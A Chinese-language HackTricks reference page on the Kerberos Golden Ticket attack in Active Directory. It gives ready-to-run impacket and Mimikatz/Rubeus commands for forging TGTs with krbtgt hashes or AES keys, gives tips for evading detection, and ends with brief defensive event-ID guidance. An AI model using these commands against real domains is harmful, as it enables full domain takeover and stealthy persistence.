# 金票

<details>

<summary><strong>从零开始学习AWS黑客技术，成为英雄</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 金票

可以**使用krbtgt AD账户的NTLM哈希**创建**任何用户的有效TGT**。伪造TGT而不是TGS的优势在于能够**访问域中的任何服务**（或机器）和被冒充的用户。\
此外，**krbtgt**的**凭据**从不会自动**更改**。

可以从域中任何DC的**lsass进程**或**NTDS.dit文件**中**获取** **krbtgt**账户的**NTLM哈希**。也可以通过**DCsync攻击**来获取NTLM，可以使用Mimikatz的[lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump)模块或impacket示例[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)来执行。通常，无论使用哪种技术，都需要**域管理员权限或类似权限**。

还必须考虑到使用**AES Kerberos密钥（AES128和AES256）**伪造票据是可能的，也是**更可取的**（操作安全性）。

{% code title="来自Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
```markdown
{% endcode %}

{% code title="来自Windows" %}
```
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**一旦**你注入了**金票**，你就可以访问共享文件**(C$)**，并执行服务和WMI，因此你可以使用**psexec**或**wmiexec**来获取一个shell（看起来你无法通过winrm获取shell）。

### 绕过常见检测

检测金票最常见的方法是**检查网络上的Kerberos流量**。默认情况下，Mimikatz **将TGT签名10年**，这在随后使用它发出的TGS请求中会显得异常。

`有效期：2021年3月11日 下午12:39:57；2031年3月9日 下午12:39:57；2031年3月9日 下午12:39:57`

使用`/startoffset`、`/endin`和`/renewmax`参数来控制开始偏移、持续时间和最大续订次数（所有时间单位都是分钟）。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
不幸的是，TGT的生命周期不会在4769事件中记录，因此你不会在Windows事件日志中找到这些信息。然而，你可以关联的是**看到4769事件**_**没有**_之前的4768事件**。**不可能在没有TGT的情况下请求TGS**，如果没有记录发出TGT，我们可以推断它是离线伪造的。

为了**绕过这种检测**，检查钻石票据：

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### 缓解措施

* 4624：账户登录
* 4672：管理员登录
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

防御者可以采取的其他小技巧是**对敏感用户的4769事件发出警报**，例如默认的域管理员账户。

[**关于Golden Ticket的更多信息在ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享你的黑客技巧**。

</details>
